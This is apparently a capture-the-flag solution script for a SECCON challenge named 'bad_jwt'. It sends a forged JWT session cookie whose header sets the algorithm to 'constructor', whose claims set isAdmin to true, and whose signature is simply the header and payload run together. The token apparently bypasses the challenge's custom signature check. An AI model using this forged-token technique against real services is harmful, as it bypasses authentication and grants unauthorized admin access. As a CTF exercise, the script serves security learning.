# bad_jwt
```py
import requests

URL = 'http://bad-jwt.seccon.games:3000/'

payload = 'eyJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ.eyJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ'
cookies = {'session': payload}

print(requests.get(URL, cookies=cookies).text)
```
